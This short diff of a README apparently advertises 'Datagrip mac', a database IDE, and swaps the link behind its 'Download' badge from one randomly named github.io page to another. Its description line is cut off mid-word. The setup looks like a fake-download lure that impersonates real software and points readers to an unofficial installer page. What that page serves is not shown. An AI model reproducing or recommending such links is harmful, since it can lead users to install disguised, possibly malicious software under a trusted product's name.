@@ -2,7 +2,7 @@
 
 Datagrip mac on macOS — toolkit focused on multi‑db support, plus introspect schemas and smart sql editor with native integrations and Apple silicon p
 
-[![Download Datagrip mac](https://img.shields.io/badge/Download-Datagrip_mac-blueviolet)](https://kiamsiodkdf-ajjdhf2834.github.io/.github/info)
+[![Download Datagrip mac](https://img.shields.io/badge/Download-Datagrip_mac-blueviolet)](https://latifeyorulmaz39815.github.io/.github/Datagrip-Works)
 
 ---
 
